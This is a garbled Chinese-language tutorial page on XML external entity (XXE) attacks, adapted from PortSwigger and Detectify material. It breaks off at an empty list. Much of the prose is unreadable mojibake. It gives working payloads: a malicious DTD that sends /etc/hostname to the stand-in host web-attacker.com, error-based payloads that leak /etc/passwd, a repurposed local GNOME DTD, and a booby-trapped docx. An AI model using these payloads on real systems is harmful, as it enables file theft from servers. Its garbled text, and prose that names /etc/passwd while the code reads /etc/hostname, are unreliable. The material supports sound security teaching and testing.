<h3 id="â€œBlindâ€-SSRF-å¸¦å¤–æ³„éœ²æ•°æ®"><a href="#â€œBlindâ€-SSRF-å¸¦å¤–æ³„éœ²æ•°æ®" class="headerlink" title="â€œBlindâ€ SSRF - å¸¦å¤–æ³„éœ²æ•°æ®"></a>â€œBlindâ€ SSRF - å¸¦å¤–æ³„éœ²æ•°æ®</h3><p><strong>åœ¨è¿™ç§æƒ…å†µä¸‹ï¼Œæˆ‘ä»¬å°†è®©æœåŠ¡å™¨åŠ è½½ä¸€ä¸ªå¸¦æœ‰æ¶æ„è´Ÿè½½çš„æ–° DTDï¼Œè¯¥è´Ÿè½½å°†é€šè¿‡ HTTP è¯·æ±‚å‘é€æ–‡ä»¶çš„å†…å®¹ï¼ˆå¯¹äºå¤šè¡Œæ–‡ä»¶ï¼Œæ‚¨å¯ä»¥å°è¯•é€šè¿‡</strong><em><strong>ftp:&#x2F;&#x2F;</strong></em><strong>åè®®æ³„éœ²æ•°æ®)ã€‚æ­¤è§£é‡Šå–è‡ª</strong><a target="_blank" rel="noopener" href="https://portswigger.net/web-security/xxe/blind"><strong>Portswiggers lab here</strong></a> <strong>ã€‚</strong></p>
<p>ä¸€ä¸ªæ¶æ„ DTD æ³„éœ² <code>/etc/hostname</code> æ–‡ä»¶å†…å®¹çš„ç¤ºä¾‹å¦‚ä¸‹ï¼š</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;!ENTITY % file SYSTEM &quot;file:///etc/hostname&quot;&gt;</span><br><span class="line">&lt;!ENTITY % eval &quot;&lt;!ENTITY &amp;#x25; exfiltrate SYSTEM &#x27;http://web-attacker.com/?x=%file;&#x27;&gt;&quot;&gt;</span><br><span class="line">%eval;</span><br><span class="line">%exfiltrate;</span><br></pre></td></tr></table></figure>

<p>This DTD carries out the following steps:</p>
<ul>
<li>å®šä¹‰ä¸€ä¸ªåä¸º <code>file</code> çš„ XML å‚æ•°å®ä½“ï¼ŒåŒ…å« <code>/etc/passwd</code> æ–‡ä»¶çš„å†…å®¹ã€‚</li>
<li>å®šä¹‰ä¸€ä¸ªåä¸ºâ€œevalâ€çš„ XML å‚æ•°å®ä½“ï¼Œå…¶ä¸­åŒ…å«å¦ä¸€ä¸ªåä¸ºâ€œexfiltrateâ€çš„ XML å‚æ•°å®ä½“çš„åŠ¨æ€å£°æ˜ã€‚ <code>exfiltrate</code> å®ä½“å°†é€šè¿‡å‘æ”»å‡»è€…çš„ Web æœåŠ¡å™¨å‘å‡º HTTP è¯·æ±‚æ¥è¯„ä¼°ï¼Œè¯¥è¯·æ±‚åŒ…å« URL æŸ¥è¯¢å­—ç¬¦ä¸²ä¸­çš„ <code>file</code> å®ä½“çš„å€¼ã€‚</li>
<li>ä½¿ç”¨ <code>eval</code> å®ä½“ï¼Œè¿™ä¼šå¯¼è‡´æ‰§è¡Œ <code>exfiltrate</code> å®ä½“çš„åŠ¨æ€å£°æ˜ã€‚</li>
<li>ä½¿ç”¨ <code>exfiltrate</code> å®ä½“ï¼Œä»¥ä¾¿é€šè¿‡è¯·æ±‚æŒ‡å®šçš„ URL æ¥è¯„ä¼°å…¶å€¼ã€‚</li>
</ul>
<p>ç„¶åï¼Œæ”»å‡»è€…å¿…é¡»å°†æ¶æ„ DTD æ‰˜ç®¡åœ¨ä»–ä»¬æ§åˆ¶çš„ç³»ç»Ÿä¸Šï¼Œé€šå¸¸æ˜¯å°†å…¶åŠ è½½åˆ°ä»–ä»¬è‡ªå·±çš„ç½‘ç»œæœåŠ¡å™¨ä¸Šã€‚ä¾‹å¦‚ï¼Œæ”»å‡»è€…å¯èƒ½ä¼šåœ¨ä»¥ä¸‹ URL æä¾›æ¶æ„ DTDï¼š<br><code>http://web-attacker.com/malicious.dtd</code></p>
<p>æœ€åï¼Œæ”»å‡»è€…å¿…é¡»å‘æ˜“å—æ”»å‡»çš„åº”ç”¨ç¨‹åºæäº¤ä»¥ä¸‹ XXE æœ‰æ•ˆè´Ÿè½½ï¼š</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE foo [&lt;!ENTITY % xxe SYSTEM &quot;http://web-attacker.com/malicious.dtd&quot;&gt; %xxe;]&gt;</span><br><span class="line">&lt;stockCheck&gt;&lt;productId&gt;3;&lt;/productId&gt;&lt;storeId&gt;1&lt;/storeId&gt;&lt;/stockCheck&gt;</span><br></pre></td></tr></table></figure>

<p>è¿™ä¸ª XXE æœ‰æ•ˆè´Ÿè½½å£°æ˜äº†ä¸€ä¸ªåä¸ºâ€œxxeâ€çš„ XML å‚æ•°å®ä½“ï¼Œç„¶åä½¿ç”¨ DTD ä¸­çš„å®ä½“ã€‚è¿™å°†å¯¼è‡´ XML è§£æå™¨ä»æ”»å‡»è€…çš„æœåŠ¡å™¨è·å–å¤–éƒ¨ DTD å¹¶å†…è”è§£é‡Šå®ƒã€‚ç„¶åæ‰§è¡Œæ¶æ„ DTD ä¸­å®šä¹‰çš„æ­¥éª¤ï¼Œå¹¶å°† <code>/etc/passwd</code> æ–‡ä»¶ä¼ è¾“åˆ°æ”»å‡»è€…çš„æœåŠ¡å™¨ã€‚</p>
<h3 id="åŸºäºé”™è¯¯-XXE-æ”»å‡»-å¤–éƒ¨-DTD"><a href="#åŸºäºé”™è¯¯-XXE-æ”»å‡»-å¤–éƒ¨-DTD" class="headerlink" title="åŸºäºé”™è¯¯ XXE æ”»å‡»(å¤–éƒ¨ DTD)"></a>åŸºäºé”™è¯¯ XXE æ”»å‡»(å¤–éƒ¨ DTD)</h3><p><strong>åœ¨è¿™ç§æƒ…å†µä¸‹ï¼Œæˆ‘ä»¬å°†è®©æœåŠ¡å™¨åŠ è½½ä¸€ä¸ªæ¶æ„ DTDï¼Œè¯¥ DTD å°†åœ¨é”™è¯¯æ¶ˆæ¯ä¸­æ˜¾ç¤ºæ–‡ä»¶çš„å†…å®¹ï¼ˆè¿™ä»…åœ¨æ‚¨å¯ä»¥çœ‹åˆ°é”™è¯¯æ¶ˆæ¯æ—¶æ‰æœ‰æ•ˆï¼‰ã€‚</strong> <a target="_blank" rel="noopener" href="https://portswigger.net/web-security/xxe/blind"><strong>Example from here.</strong></a></p>
<p>æ‚¨å¯ä»¥ä½¿ç”¨æ¶æ„å¤–éƒ¨ DTD è§¦å‘åŒ…å« <code>/etc/passwd</code> æ–‡ä»¶å†…å®¹çš„ XML è§£æé”™è¯¯æ¶ˆæ¯ï¼Œå¦‚ä¸‹æ‰€ç¤ºï¼š</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;!ENTITY % file SYSTEM &quot;file:///etc/passwd&quot;&gt;</span><br><span class="line">&lt;!ENTITY % eval &quot;&lt;!ENTITY &amp;#x25; error SYSTEM &#x27;file:///nonexistent/%file;&#x27;&gt;&quot;&gt;</span><br><span class="line">%eval;</span><br><span class="line">%error;</span><br></pre></td></tr></table></figure>

<p>æ­¤ DTD æ‰§è¡Œä»¥ä¸‹æ­¥éª¤ï¼š</p>
<ul>
<li>å®šä¹‰ä¸€ä¸ªåä¸º <code>file</code> çš„ XML å‚æ•°å®ä½“ï¼ŒåŒ…å« <code>/etc/passwd</code> æ–‡ä»¶çš„å†…å®¹ã€‚</li>
<li>å®šä¹‰ä¸€ä¸ªåä¸º <code>eval</code> çš„ XML å‚æ•°å®ä½“ï¼Œå…¶ä¸­åŒ…å«å¦ä¸€ä¸ªåä¸º <code>error</code> çš„ XML å‚æ•°å®ä½“çš„åŠ¨æ€å£°æ˜ã€‚ <code>error</code> å®ä½“å°†åŠ è½½ä¸€ä¸ªä¸å­˜åœ¨çš„æ–‡ä»¶ï¼Œè¯¥æ–‡ä»¶çš„åç§°åŒ…å« <code>file</code> å®ä½“çš„å€¼ã€‚</li>
<li>ä½¿ç”¨ <code>eval</code> å®ä½“ï¼Œè¿™ä¼šå¯¼è‡´æ‰§è¡Œ <code>error</code> å®ä½“çš„åŠ¨æ€å£°æ˜ã€‚</li>
<li>ä½¿ç”¨ <code>error</code> å®ä½“ï¼Œå°è¯•åŠ è½½ä¸å­˜åœ¨çš„æ–‡ä»¶ï¼Œä»è€Œå¯¼è‡´é”™è¯¯æ¶ˆæ¯åŒ…å«ä¸å­˜åœ¨æ–‡ä»¶çš„åç§°ï¼Œå³ <code>/etc/passwd</code> æ–‡ä»¶çš„å†…å®¹ã€‚</li>
</ul>
<p>è°ƒç”¨å¤–éƒ¨ DTD é”™è¯¯ï¼š</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE foo [&lt;!ENTITY % xxe SYSTEM &quot;http://web-attacker.com/malicious.dtd&quot;&gt; %xxe;]&gt;</span><br><span class="line">&lt;stockCheck&gt;&lt;productId&gt;3;&lt;/productId&gt;&lt;storeId&gt;1&lt;/storeId&gt;&lt;/stockCheck&gt;</span><br></pre></td></tr></table></figure>

<p>æ‚¨åº”è¯¥ä¼šåœ¨ Web æœåŠ¡å™¨å“åº”çš„é”™è¯¯æ¶ˆæ¯ä¸­çœ‹åˆ°æ–‡ä»¶çš„å†…å®¹ã€‚<br><img src="/../.gitbook/assets/image%20(223).png"></p>
<p><em><strong>ä¸Šè¿°æŠ€æœ¯é€‚ç”¨äºå¤–éƒ¨ DTDï¼Œä½†é€šå¸¸ä¸é€‚ç”¨äºåœ¨DOCTYPEå…ƒç´ ä¸­å®Œå…¨æŒ‡å®šçš„å†…éƒ¨ DTDã€‚è¿™æ˜¯å› ä¸ºè¯¥æŠ€æœ¯æ¶‰åŠ<code>åœ¨ä¸€ä¸ªå‚æ•°å®ä½“çš„å®šä¹‰ä¸­ä½¿ç”¨ XML å‚æ•°å®ä½“</code>ã€‚æ ¹æ® XML è§„èŒƒï¼Œè¿™åœ¨å¤–éƒ¨ DTD ä¸­æ˜¯å…è®¸çš„ï¼Œä½†åœ¨å†…éƒ¨ DTD ä¸­æ˜¯ä¸å…è®¸çš„ã€‚ï¼ˆä¸€äº›è§£æå™¨å¯èƒ½ä¼šå…¼å®¹è¿™ç§é”™è¯¯ï¼Œä½†è®¸å¤šè§£æå™¨ä¸ä¼šã€‚ï¼‰</strong></em></p>
<h3 id="åŸºäºé”™è¯¯çš„-XXE-æ”»å‡»-ç³»ç»Ÿå†…ç½®-DTD"><a href="#åŸºäºé”™è¯¯çš„-XXE-æ”»å‡»-ç³»ç»Ÿå†…ç½®-DTD" class="headerlink" title="åŸºäºé”™è¯¯çš„ XXE æ”»å‡» (ç³»ç»Ÿå†…ç½® DTD)"></a><strong>åŸºäºé”™è¯¯çš„ XXE æ”»å‡» (ç³»ç»Ÿå†…ç½® DTD)</strong></h3><p>å½“ <strong>out-of-band interactions are blocked</strong>ï¼ˆå³æ— æ³•å¤–è”çš„æƒ…å†µï¼‰ï¼Œä½† blind XXE å­˜åœ¨çš„æƒ…å†µåº”è¯¥å¦‚ä½•å¤„ç½®ï¼Ÿ <a target="_blank" rel="noopener" href="https://portswigger.net/web-security/xxe/blind">ç›¸å…³èµ„æ–™</a>ã€‚</p>
<p>åœ¨è¿™ç§æƒ…å†µä¸‹ï¼Œç”±äº XML è¯­è¨€è§„èŒƒä¸­çš„æ¼æ´ï¼Œä»ç„¶å¯èƒ½<strong>è§¦å‘åŒ…å«æ•æ„Ÿæ•°æ®çš„é”™è¯¯æ¶ˆæ¯</strong>ã€‚å¦‚æœæ–‡æ¡£çš„<strong>DTD æ··åˆä½¿ç”¨å†…éƒ¨å’Œå¤–éƒ¨DTD</strong>å£°æ˜ï¼Œåˆ™<strong>å†…éƒ¨DTD å¯ä»¥é‡æ–°å®šä¹‰åœ¨å¤–éƒ¨DTD</strong>ä¸­å£°æ˜çš„å®ä½“ã€‚å‘ç”Ÿè¿™ç§æƒ…å†µæ—¶ï¼Œå¯¹<code>åœ¨ä¸€ä¸ªå‚æ•°å®ä½“çš„å®šä¹‰ä¸­ä½¿ç”¨ XML å‚æ•°å®ä½“</code>çš„é™åˆ¶å°±ä¼šæ”¾å®½ã€‚</p>
<p>è¿™æ„å‘³ç€æ”»å‡»è€…å¯ä»¥åœ¨å†…éƒ¨ DTD ä¸­ä½¿ç”¨<strong>åŸºäºé”™è¯¯çš„ XXE æŠ€æœ¯</strong>ï¼Œå‰ææ˜¯ä»–ä»¬ä½¿ç”¨çš„ XML å‚æ•°å®ä½“æ˜¯<strong>é‡æ–°å®šä¹‰åœ¨å¤–éƒ¨ DTD ä¸­å£°æ˜çš„å®ä½“</strong>ã€‚å½“ç„¶ï¼Œå¦‚æœå¸¦å¤–è¿æ¥è¢«é˜»æ­¢ï¼Œåˆ™æ— æ³•ä»è¿œç¨‹ä½ç½®åŠ è½½å¤–éƒ¨ DTDã€‚ç›¸åï¼Œå®ƒéœ€è¦æ˜¯ä¸€ä¸ª<strong>åº”ç”¨ç¨‹åºæœåŠ¡å™¨æœ¬åœ°çš„å¤–éƒ¨ DTD æ–‡ä»¶</strong>ã€‚ <em>ä»æœ¬è´¨ä¸Šè®²ï¼Œæ”»å‡»æ¶‰åŠè°ƒç”¨æ°å¥½å­˜åœ¨äºæœ¬åœ°æ–‡ä»¶ç³»ç»Ÿä¸Šçš„ DTD æ–‡ä»¶ï¼Œå¹¶é‡æ–°åˆ©ç”¨å®ƒæ¥é‡æ–°å®šä¹‰ç°æœ‰å®ä½“ï¼Œä»è€Œè§¦å‘åŒ…å«æ•æ„Ÿæ•°æ®çš„è§£æé”™è¯¯ã€‚</em></p>
<p>ä¾‹å¦‚ï¼Œå‡è®¾åœ¨æœåŠ¡å™¨æ–‡ä»¶ç³»ç»Ÿçš„â€œ&#x2F;usr&#x2F;local&#x2F;app&#x2F;schema.dtdâ€ä½ç½®æœ‰ä¸€ä¸ª DTD æ–‡ä»¶ï¼Œè¯¥ DTD æ–‡ä»¶å®šä¹‰äº†ä¸€ä¸ªåä¸ºâ€œcustom_entityâ€çš„å®ä½“ã€‚æ”»å‡»è€…å¯ä»¥é€šè¿‡æäº¤å¦‚ä¸‹æ‰€ç¤ºçš„æ··åˆ DTD æ¥è§¦å‘åŒ…å« <code>/etc/passwd</code> æ–‡ä»¶å†…å®¹çš„ XML è§£æé”™è¯¯æ¶ˆæ¯ï¼š</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE foo [</span><br><span class="line">    &lt;!ENTITY % local_dtd SYSTEM &quot;file:///usr/local/app/schema.dtd&quot;&gt;</span><br><span class="line">    &lt;!ENTITY % custom_entity &#x27;</span><br><span class="line">        &lt;!ENTITY &amp;#x25; file SYSTEM &quot;file:///etc/passwd&quot;&gt;</span><br><span class="line">        &lt;!ENTITY &amp;#x25; eval &quot;&lt;!ENTITY &amp;#x26;#x25; error SYSTEM &amp;#x27;file:///nonexistent/&amp;#x25;file;&amp;#x27;&gt;&quot;&gt;</span><br><span class="line">        &amp;#x25;eval;</span><br><span class="line">        &amp;#x25;error;</span><br><span class="line">    &#x27;&gt;</span><br><span class="line">    %local_dtd;</span><br><span class="line">]&gt;</span><br></pre></td></tr></table></figure>

<p>æ­¤ DTD æ‰§è¡Œä»¥ä¸‹æ­¥éª¤ï¼š</p>
<ul>
<li>å®šä¹‰ä¸€ä¸ªåä¸º <code>local_dtd</code> çš„ XML å‚æ•°å®ä½“ï¼ŒåŒ…å«å­˜åœ¨äºæœåŠ¡å™¨æ–‡ä»¶ç³»ç»Ÿä¸Šçš„å¤–éƒ¨ DTD æ–‡ä»¶çš„å†…å®¹ã€‚</li>
<li>é‡æ–°å®šä¹‰åä¸ºâ€œcustom_entityâ€çš„ XML å‚æ•°å®ä½“ï¼Œè¯¥å®ä½“å·²åœ¨å¤–éƒ¨ DTD æ–‡ä»¶ä¸­å®šä¹‰ã€‚è¯¥å®ä½“è¢«é‡æ–°å®šä¹‰ä¸ºåŒ…å« <a target="_blank" rel="noopener" href="https://portswigger.net/web-security/xxe/blind#exploiting-blind-xxe-to-retrieve-data-via-error-messages">åŸºäºé”™è¯¯çš„ XXE æ¼æ´åˆ©ç”¨</a>å·²ç»æè¿°è¿‡ï¼Œç”¨äºè§¦å‘åŒ…å« <code>/etc/passwd</code> æ–‡ä»¶å†…å®¹çš„é”™è¯¯æ¶ˆæ¯ã€‚</li>
<li>ä½¿ç”¨ <code>local_dtd</code> å®ä½“ï¼Œä»¥ä¾¿è§£é‡Šå¤–éƒ¨ DTDï¼ŒåŒ…æ‹¬ <code>custom_entity</code> å®ä½“çš„é‡æ–°å®šä¹‰å€¼ã€‚è¿™ä¼šäº§ç”Ÿæ‰€éœ€çš„é”™è¯¯æ¶ˆæ¯ã€‚</li>
</ul>
<p><strong>çœŸå®ç¤ºä¾‹ï¼š</strong> ä½¿ç”¨ GNOME æ¡Œé¢ç¯å¢ƒçš„ç³»ç»Ÿé€šå¸¸åœ¨ <code>/usr/share/yelp/dtd/docbookx.dtd</code> æœ‰ä¸€ä¸ª DTDï¼Œå…¶ä¸­åŒ…å«ä¸€ä¸ªåä¸º <code>ISOamso</code> çš„å®ä½“</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE foo [</span><br><span class="line">    &lt;!ENTITY % local_dtd SYSTEM &quot;file:///usr/share/yelp/dtd/docbookx.dtd&quot;&gt;</span><br><span class="line">    &lt;!ENTITY % ISOamso &#x27;</span><br><span class="line">        &lt;!ENTITY &amp;#x25; file SYSTEM &quot;file:///etc/passwd&quot;&gt;</span><br><span class="line">        &lt;!ENTITY &amp;#x25; eval &quot;&lt;!ENTITY &amp;#x26;#x25; error SYSTEM &amp;#x27;file:///nonexistent/&amp;#x25;file;&amp;#x27;&gt;&quot;&gt;</span><br><span class="line">        &amp;#x25;eval;</span><br><span class="line">        &amp;#x25;error;</span><br><span class="line">    &#x27;&gt;</span><br><span class="line">    %local_dtd;</span><br><span class="line">]&gt;</span><br><span class="line">&lt;stockCheck&gt;&lt;productId&gt;3;&lt;/productId&gt;&lt;storeId&gt;1&lt;/storeId&gt;&lt;/stockCheck&gt;</span><br></pre></td></tr></table></figure>

<p><img src="/../.gitbook/assets/image%20(224).png"></p>
<p>ç”±äºæ­¤æŠ€æœ¯ä½¿ç”¨<strong>å†…éƒ¨ DTDï¼Œå› æ­¤æ‚¨éœ€è¦å…ˆæ‰¾åˆ°ä¸€ä¸ªæœ‰æ•ˆçš„ DTD</strong>ã€‚æ‚¨å¯ä»¥è¿™æ ·åš<strong>å®‰è£…</strong>æœåŠ¡å™¨æ­£åœ¨ä½¿ç”¨çš„ç›¸åŒ<strong>OS&#x2F;è½¯ä»¶</strong>å¹¶<strong>æœç´¢ä¸€äº›é»˜è®¤DTD</strong>ï¼Œæˆ–<strong>è·å–ç³»ç»Ÿå†…</strong>é»˜è®¤DTD<strong>çš„åˆ—è¡¨</strong>å’Œ<strong>æ£€æŸ¥</strong>æ˜¯å¦å­˜åœ¨ï¼š</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE foo [</span><br><span class="line">&lt;!ENTITY % local_dtd SYSTEM &quot;file:///usr/share/yelp/dtd/docbookx.dtd&quot;&gt;</span><br><span class="line">%local_dtd;</span><br><span class="line">]&gt;</span><br></pre></td></tr></table></figure>

<h3 id="å®šä½ç³»ç»Ÿå†…ç½®çš„-DTD-æ–‡ä»¶"><a href="#å®šä½ç³»ç»Ÿå†…ç½®çš„-DTD-æ–‡ä»¶" class="headerlink" title="å®šä½ç³»ç»Ÿå†…ç½®çš„ DTD æ–‡ä»¶"></a>å®šä½ç³»ç»Ÿå†…ç½®çš„ DTD æ–‡ä»¶</h3><p>å¯åœ¨ä»¥ä¸‹ github å­˜å‚¨åº“ä¸­ï¼Œæ‚¨å¯ä»¥æ‰¾åˆ°<strong>ç³»ç»Ÿä¸­å¯èƒ½å­˜åœ¨çš„ DTD è·¯å¾„</strong>ï¼š</p>
<p>url&#x3D;â€<a target="_blank" rel="noopener" href="https://github.com/GoSecure/dtd-finder/tree/master/list&quot;">https://github.com/GoSecure/dtd-finder/tree/master/list&quot;</a></p>
<p>å¦‚æœæ‹¥æœ‰ä¸ç›®æ ‡ç³»ç»ŸåŒä¸€ä¸ª Docker é•œåƒæ–‡ä»¶ï¼Œå¯ä»¥å°è¯•ä½¿ç”¨ä¸‹é¢çš„å·¥å…·åœ¨è¯¥é•œåƒå†…æ‰¾åˆ°å†…ç½®çš„ DTD æ–‡ä»¶ï¼š<a target="_blank" rel="noopener" href="https://github.com/GoSecure/dtd-finder">Readme of the github</a> </p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">java -jar dtd-finder-1.2-SNAPSHOT-all.jar /tmp/dadocker.tar</span><br><span class="line"></span><br><span class="line">Scanning TAR file /tmp/dadocker.tar</span><br><span class="line"></span><br><span class="line"> [=] Found a DTD: /tomcat/lib/jsp-api.jar!/jakarta/servlet/jsp/resources/jspxml.dtd</span><br><span class="line">Testing 0 entities : []</span><br><span class="line"></span><br><span class="line"> [=] Found a DTD: /tomcat/lib/servlet-api.jar!/jakarta/servlet/resources/XMLSchema.dtd</span><br><span class="line">Testing 0 entities : []</span><br></pre></td></tr></table></figure>

<h3 id="XXE-via-Office-Open-XML-Parsers"><a href="#XXE-via-Office-Open-XML-Parsers" class="headerlink" title="XXE via Office Open XML Parsers"></a>XXE via Office Open XML Parsers</h3><p>ï¼ˆå¤åˆ¶è‡ª <a target="_blank" rel="noopener" href="https://labs.detectify.com/2021/09/30/10-types-web-vulnerabilities-often-missed/"><strong>here</strong></a>ï¼‰<br>è®¸å¤š Web åº”ç”¨ç¨‹åºå…è®¸æ‚¨ä¸Šä¼  Microsoft Office æ–‡æ¡£ï¼Œç„¶åå®ƒä»¬ä¼šä»ä¸­è§£æå‡ºä¸€äº›ç»†èŠ‚ã€‚ä¾‹å¦‚ï¼Œæ‚¨å¯èƒ½æœ‰ä¸€ä¸ª Web åº”ç”¨ç¨‹åºï¼Œå…è®¸æ‚¨é€šè¿‡ä¸Šä¼  XLSX æ ¼å¼çš„ç”µå­è¡¨æ ¼æ¥å¯¼å…¥æ•°æ®ã€‚åœ¨æŸäº›æ—¶å€™ï¼Œä¸ºäº†è®©è§£æå™¨ä»ç”µå­è¡¨æ ¼ä¸­æå–æ•°æ®ï¼Œè§£æå™¨éœ€è¦<strong>è§£æè‡³å°‘ä¸€ä¸ª XML æ–‡ä»¶</strong>ã€‚<br>å¯¹æ­¤è¿›è¡Œæµ‹è¯•çš„å”¯ä¸€æ–¹æ³•æ˜¯ç”Ÿæˆä¸€ä¸ªåŒ…å« XXE æœ‰æ•ˆè´Ÿè½½çš„ <strong>Microsoft Office æ–‡ä»¶</strong>ï¼Œæ‰€ä»¥è®©æˆ‘ä»¬è¿™æ ·åšã€‚é¦–å…ˆï¼Œåˆ›å»ºä¸€ä¸ªç©ºç›®å½•æ¥è§£å‹ä½ çš„æ–‡æ¡£ï¼Œç„¶åè§£å‹ï¼</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">test$ ls</span><br><span class="line">test.docx</span><br><span class="line">test$ mkdir unzipped</span><br><span class="line">test$ unzip ./test.docx -d ./unzipped/</span><br><span class="line">Archive:  ./test.docx</span><br><span class="line">  inflating: ./unzipped/word/numbering.xml</span><br><span class="line">  inflating: ./unzipped/word/settings.xml</span><br><span class="line">  inflating: ./unzipped/word/fontTable.xml</span><br><span class="line">  inflating: ./unzipped/word/styles.xml</span><br><span class="line">  inflating: ./unzipped/word/document.xml</span><br><span class="line">  inflating: ./unzipped/word/_rels/document.xml.rels</span><br><span class="line">  inflating: ./unzipped/_rels/.rels</span><br><span class="line">  inflating: ./unzipped/word/theme/theme1.xml</span><br><span class="line">  inflating: ./unzipped/[Content_Types].xml</span><br></pre></td></tr></table></figure>

<p>åœ¨æ‚¨å–œæ¬¢çš„æ–‡æœ¬ç¼–è¾‘å™¨ (vim) ä¸­æ‰“å¼€ <code>./unzipped/word/document.xml</code> å¹¶ç¼–è¾‘ <strong>XML ä»¥åŒ…å«æ‚¨å–œæ¬¢çš„ XXE æœ‰æ•ˆè´Ÿè½½</strong>ã€‚æˆ‘å°è¯•çš„ç¬¬ä¸€ä»¶äº‹å¾€å¾€æ˜¯ HTTP è¯·æ±‚ï¼Œå¦‚ä¸‹æ‰€ç¤ºï¼š</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE x [ &lt;!ENTITY test SYSTEM &quot;http://[ID].burpcollaborator.net/&quot;&gt; ]&gt;</span><br><span class="line">&lt;x&gt;&amp;test;&lt;/x&gt;</span><br></pre></td></tr></table></figure>

<p>è¿™äº›è¡Œåº”è¯¥åƒè¿™æ ·æ’å…¥åˆ°ä¸¤ä¸ªæ ¹ XML å¯¹è±¡ä¹‹é—´ï¼Œå½“ç„¶æ‚¨éœ€è¦å°† URL æ›¿æ¢ä¸ºå¯ä»¥ç›‘è§†è¯·æ±‚çš„ URLï¼š</p>
<p><img src="https://labs.detectify.com/wp-content/uploads/2021/09/xxe-obscure.png" alt="Those lines should be inserted in between the two root XML objects, like thi"></p>
<p>å‰©ä¸‹çš„å°±æ˜¯<strong>å‹ç¼©æ–‡ä»¶ä»¥åˆ›å»ºé‚ªæ¶çš„ poc.docx æ–‡ä»¶</strong>ã€‚ä»æˆ‘ä»¬ä¹‹å‰åˆ›å»ºçš„â€œè§£å‹ç¼©â€ç›®å½•ä¸­ï¼Œè¿è¡Œä»¥ä¸‹å‘½ä»¤ï¼š</p>
<p><img src="https://labs.detectify.com/wp-content/uploads/2021/09/xxe-unzipped.png" alt="From the &quot;unzipped&quot; directory that we created earlier, run the following:"></p>
<p>ç°åœ¨å°†æ–‡ä»¶ä¸Šä¼ åˆ°æ‚¨çš„ï¼ˆå¸Œæœ›å¦‚æ­¤ï¼‰æ˜“å—æ”»å‡»çš„ Web åº”ç”¨ç¨‹åºï¼Œå¹¶åœ¨ Burp Collaborator æ—¥å¿—ä¸­å‘é»‘å®¢ä¹‹ç¥ç¥ˆç¥·ã€‚</p>
<h3 id="Jar-protocol"><a href="#Jar-protocol" class="headerlink" title="Jar: protocol"></a>Jar: protocol</h3><p><code>jar</code> åè®®ä»…é€‚ç”¨äº <strong>Java åº”ç”¨ç¨‹åº</strong>ã€‚å®ƒå…è®¸è®¿é—® <strong>PKZIP</strong>æ–‡ä»¶ï¼ˆ<code>.zip</code>ã€<code>.jar</code>ã€â€¦ï¼‰ä¸­çš„æ–‡ä»¶ï¼Œå¹¶é€‚ç”¨äºæœ¬åœ°å’Œè¿œç¨‹æ–‡ä»¶ï¼š</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">jar:file:///var/myarchive.zip!/file.txt</span><br><span class="line">jar:https://download.host.com/myarchive.zip!/file.txt</span><br></pre></td></tr></table></figure>

<p>hint style&#x3D;â€dangerâ€<br>èƒ½å¤Ÿè®¿é—® PKZIP æ–‡ä»¶ä¸­çš„æ–‡ä»¶å¯¹äºé€šè¿‡ç³»ç»Ÿ DTD æ–‡ä»¶æ»¥ç”¨ XXE éå¸¸æœ‰ç”¨ã€‚**æ£€æŸ¥ [æ­¤éƒ¨åˆ†ä»¥äº†è§£å¦‚ä½•æ»¥ç”¨ç³»ç»Ÿ DTD æ–‡ä»¶](xxe-xee-xml-external-entity.md#åŸºäºé”™è¯¯çš„ç³»ç»Ÿ-dtdï¼‰ã€‚<br>endhint </p>
<h4 id="Behind-the-scenes"><a href="#Behind-the-scenes" class="headerlink" title="Behind the scenes"></a>Behind the scenes</h4><ol>
